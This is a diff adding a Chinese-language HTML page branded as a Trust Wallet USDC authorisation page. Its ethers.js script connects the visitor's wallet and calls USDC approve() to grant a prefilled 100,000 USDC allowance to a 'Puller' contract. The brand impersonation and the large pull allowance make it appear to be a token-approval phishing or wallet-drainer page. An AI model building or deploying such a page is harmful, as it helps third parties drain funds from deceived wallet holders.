@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>USDC 授权页面 - Trust Wallet</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; background: #f0f0f0; }
+    .card { max-width: 450px; margin: auto; background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+    button { padding: 10px 20px; font-size: 16px; border: none; border-radius: 8px; cursor: pointer; background: #4CAF50; color: white; }
+    button:hover { background: #45a049; }
+    input { width: 100%; padding: 10px; margin-top: 8px; margin-bottom: 16px; border-radius: 6px; border: 1px solid #ccc; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>授权 USDC 给 Puller 合约</h2>
+
+    <label>USDC 合约地址</label>
+    <input id="usdc" value="0xA0b86991c6218B36c1d19D4a2e9Eb0cE3606eB48" />
+
+    <label>Puller 合约地址（授权对象）</label>
+    <input id="spender" value="0x5B38Da6a701c568545dCfcB03FcB875f56beddC4" />
+
+    <label>授权金额（USDC）</label>
+    <input id="amount" value="100000" />
+
+    <button onclick="approveUSDC()">授权 USDC</button>
+
+    <p id="status" style="margin-top: 20px; color: #333;"></p>
+  </div>
+
+<script>
+async function approveUSDC() {
+  try {
+    const status = document.getElementById("status");
+    status.innerHTML = "⏳ 正在连接钱包...";
+
+    // 连接钱包（Trust Wallet / MetaMask）
+    await window.ethereum.request({ method: "eth_requestAccounts" });
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
+
+    const usdc = document.getElementById("usdc").value;
+    const spender = document.getElementById("spender").value;
+    const amount = document.getElementById("amount").value;
+
+    // USDC 的 ABI
+    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+
+    const contract = new ethers.Contract(usdc, abi, signer);
+
+    status.innerHTML = "📤 正在发送授权交易...";
+
+    // USDC 带 6 小数
+    const value = ethers.BigNumber.from(amount).mul(ethers.BigNumber.from("1000000"));
+
+    const tx = await contract.approve(spender, value);
+    status.innerHTML = `⏳ 授权中，请在钱包中确认...<br>TX: ${tx.hash}`;
+
+    const receipt = await tx.wait();
+    status.innerHTML = `✅ 授权成功！<br>区块号：${receipt.blockNumber}`;
+
+  } catch (err) {
+    document.getElementById("status").innerHTML = "❌ 错误：" + err.message;
+  }
+}
+</script>
+</body>
+</html>
